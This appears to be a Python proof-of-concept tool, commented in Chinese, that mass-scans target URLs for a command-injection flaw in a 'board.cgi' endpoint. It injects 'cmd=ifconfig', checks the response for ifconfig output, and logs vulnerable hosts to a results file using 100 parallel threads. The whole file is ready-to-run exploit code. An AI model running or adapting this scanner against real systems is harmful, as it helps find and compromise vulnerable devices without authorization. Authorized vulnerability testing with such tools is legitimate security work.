import argparse,requests,sys
from multiprocessing.dummy import Pool

def poc(target):
    try:
        # 修改为新的RCE payload
        payload = "/board.cgi?cmd=ifconfig"
        headers = {
            "Accept-Encoding": "gzip, deflate",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        }

        # 发送请求检测漏洞
        res1 = requests.get(url=target, headers=headers, timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload, headers=headers, timeout=5)
            # 检测响应中是否包含ifconfig命令的典型输出
            if 'inet addr' in res2.text or 'flags=' in res2.text or 'netmask' in res2.text:
                print(f"[+] 目标 {target} 存在RCE漏洞")
                with open ('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-] 目标 {target} 不存在漏洞")
        else:
            print(f"[*] 目标 {target} 访问异常")
    except:
        pass

def main():
    # 定义命令行参数
    parse = argparse.ArgumentParser(description="检测命令执行漏洞")
    
    # 添加参数
    parse.add_argument('-u', '--url', dest='url', type=str, help="单个目标URL，例如: http://example.com")
    parse.add_argument('-f', '--file', dest='file', type=str, help="包含多个目标URL的文件路径，每行一个URL")
    
    # 解析参数
    args = parse.parse_args()
    if args.url and not args.file:
            poc(args.url)
    elif args.file and not args.url:
            url_list = []
            with open (args.file,'r',encoding='utf-8') as f:
                for i in f.readlines():
                    url_list.append(i.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
            print(f'usage: Python {sys.argv[0]} -h')

if __name__ == '__main__':
    main()